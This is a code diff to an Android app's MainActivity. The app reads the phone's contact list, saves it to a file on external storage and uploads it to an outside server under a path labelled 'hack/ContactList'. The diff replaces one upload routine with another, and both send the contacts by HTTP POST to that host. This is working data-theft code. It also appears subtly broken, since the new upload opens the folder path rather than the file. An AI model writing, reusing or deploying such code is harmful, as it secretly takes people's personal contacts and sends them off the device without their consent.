@@ -12,22 +12,28 @@ import android.util.Log;
 import android.widget.TextView;
 import android.widget.Toast;
 
-import java.io.DataOutputStream;
+import org.apache.commons.io.IOUtils;
+import org.apache.http.HttpResponse;
+import org.apache.http.client.HttpClient;
+import org.apache.http.client.methods.HttpPost;
+import org.apache.http.entity.mime.MultipartEntity;
+import org.apache.http.entity.mime.content.InputStreamBody;
+import org.apache.http.impl.client.DefaultHttpClient;
+
+import java.io.ByteArrayInputStream;
+
 import java.io.File;
 import java.io.FileInputStream;
+import java.io.FileNotFoundException;
 import java.io.FileWriter;
 import java.io.IOException;
-import java.net.HttpURLConnection;
-import java.net.MalformedURLException;
-import java.net.URL;
+import java.io.InputStream;
 
 
 public class MainActivity extends AppCompatActivity {
     public TextView outputText;
     final String uploadFilePath = Environment.getExternalStorageDirectory().getPath() + "/Notes/";
     final String uploadFileName = "ContactList";
-    int serverResponseCode = 0;
-    String upLoadServerUri = "http://www.warmodroid.xyz/hack/ContactList/UploadToServer.php";
 
     @Override
     public void onCreate(Bundle savedInstanceState) {
@@ -106,15 +112,15 @@ public class MainActivity extends AppCompatActivity {
             outputText.setText(output);
             Log.v("contactsList",output.toString());
             generateNoteOnSD(this,"ContactList",output.toString());
-            uploadFile(uploadFilePath+uploadFileName);
-            Log.v("ContactList",uploadFilePath + "" + uploadFileName);
+            uploadFile(uploadFilePath,uploadFileName);
+            Log.v("List",uploadFilePath + "" + uploadFileName);
         }
     }
 
 
     public void generateNoteOnSD(Context context, String sFileName, String sBody) {
         try {
-            File root = new File(Environment.getExternalStorageDirectory(), "Notes");
+            File root = new File(Environment.getExternalStorageDirectory(), "/Notes/");
             if (!root.exists()) {
                 root.mkdirs();
             }
@@ -128,146 +134,35 @@ public class MainActivity extends AppCompatActivity {
             e.printStackTrace();
         }
     }
+    private void uploadFile(String filePath, String fileName) {
 
-
-
-
-
-
-    public int uploadFile(String sourceFileUri) {
-
-
-        String fileName = sourceFileUri;
-
-        HttpURLConnection conn = null;
-        DataOutputStream dos = null;
-        String lineEnd = "\r\n";
-        String twoHyphens = "--";
-        String boundary = "*****";
-        int bytesRead, bytesAvailable, bufferSize;
-        byte[] buffer;
-        int maxBufferSize = 1 * 1024 * 1024;
-        File sourceFile = new File(sourceFileUri);
-
-        if (!sourceFile.isFile()) {
-
-            //dialog.dismiss();
-
-            Log.e("uploadFile", "Source File not exist :"
-                    + uploadFilePath + "" + uploadFileName);
-
-            runOnUiThread(new Runnable() {
-                public void run() {
-                    Log.v("List","Source File not exist :" + uploadFilePath + "" + uploadFileName);
-                }
-            });
-
-            return 0;
-
-        } else {
+        InputStream inputStream;
+        try {
+            inputStream = new FileInputStream(new File(filePath));
+            byte[] data;
             try {
+                data = IOUtils.toByteArray(inputStream);
 
-                // open a URL connection to the Servlet
-                FileInputStream fileInputStream = new FileInputStream(sourceFile);
-                URL url = new URL(upLoadServerUri);
+                HttpClient httpClient = new DefaultHttpClient();
+                HttpPost httpPost = new HttpPost("http://warmodroid.xyz/hack/ContactList/ping.php");
 
-                // Open a HTTP  connection to  the URL
-                conn = (HttpURLConnection) url.openConnection();
-                conn.setDoInput(true); // Allow Inputs
-                conn.setDoOutput(true); // Allow Outputs
-                conn.setUseCaches(false); // Don't use a Cached Copy
-                conn.setRequestMethod("POST");
-                conn.setRequestProperty("Connection", "Keep-Alive");
-                conn.setRequestProperty("ENCTYPE", "multipart/form-data");
-                conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
-                conn.setRequestProperty("uploaded_file", fileName);
+                InputStreamBody inputStreamBody = new InputStreamBody(new ByteArrayInputStream(data), fileName);
+                MultipartEntity multipartEntity = new MultipartEntity();
+                multipartEntity.addPart("file", inputStreamBody);
+                httpPost.setEntity(multipartEntity);
+                HttpResponse httpResponse = httpClient.execute(httpPost);
 
-                dos = new DataOutputStream(conn.getOutputStream());
+                // Handle response back from script.
+                if(httpResponse != null) {
 
-                dos.writeBytes(twoHyphens + boundary + lineEnd);
-                dos.writeBytes("Content-Disposition: form-data; name=\"uploaded_file\";filename=\""
-                        + fileName + "\"" + lineEnd);
-
-                dos.writeBytes(lineEnd);
-
-                // create a buffer of  maximum size
-                bytesAvailable = fileInputStream.available();
-
-                bufferSize = Math.min(bytesAvailable, maxBufferSize);
-                buffer = new byte[bufferSize];
-
-                // read file and write it into form...
-                bytesRead = fileInputStream.read(buffer, 0, bufferSize);
-
-                while (bytesRead > 0) {
-
-                    dos.write(buffer, 0, bufferSize);
-                    bytesAvailable = fileInputStream.available();
-                    bufferSize = Math.min(bytesAvailable, maxBufferSize);
-                    bytesRead = fileInputStream.read(buffer, 0, bufferSize);
+                } else { // Error, no response.
 
                 }
-
-                // send multipart form data necesssary after file data...
-                dos.writeBytes(lineEnd);
-                dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
-
-                // Responses from the server (code and message)
-                serverResponseCode = conn.getResponseCode();
-                String serverResponseMessage = conn.getResponseMessage();
-
-                Log.v("List", "HTTP Response is : "
-                        + serverResponseMessage + ": " + serverResponseCode);
-
-                if (serverResponseCode == 200) {
-
-                    runOnUiThread(new Runnable() {
-                        public void run() {
-
-                            String msg = "File Upload Completed.\n\n See uploaded file here : \n\n" + " serverpath"
-                                    + uploadFileName;
-
-                            Log.v("List",msg);
-                            Toast.makeText(MainActivity.this, "File Upload Complete.",
-                                    Toast.LENGTH_SHORT).show();
-                        }
-                    });
-                }
-
-                //close the streams //
-                fileInputStream.close();
-                dos.flush();
-                dos.close();
-
-            } catch (MalformedURLException ex) {
-
-                //dialog.dismiss();
-                ex.printStackTrace();
-
-                runOnUiThread(new Runnable() {
-                    public void run() {
-                        Log.v("List","MalformedURLException Exception : check script url.");
-                        Toast.makeText(MainActivity.this, "MalformedURLException", Toast.LENGTH_SHORT).show();
-                    }
-                });
-
-                Log.e("Upload file to server", "error: " + ex.getMessage(), ex);
-            } catch (Exception e) {
-
-                //dialog.dismiss();
+            } catch (IOException e) {
                 e.printStackTrace();
-
-                runOnUiThread(new Runnable() {
-                    public void run() {
-                        //messageText.setText("Got Exception : see logcat ");
-                        Toast.makeText(MainActivity.this, "Got Exception : see logcat ",
-                                Toast.LENGTH_SHORT).show();
-                    }
-                });
-                Log.e("Upload file to seption", "Exception : " + e.getMessage(), e);
             }
-            //dialog.dismiss();
-            return serverResponseCode;
+        } catch (FileNotFoundException e1) {
+            e1.printStackTrace();
         }
     }
 
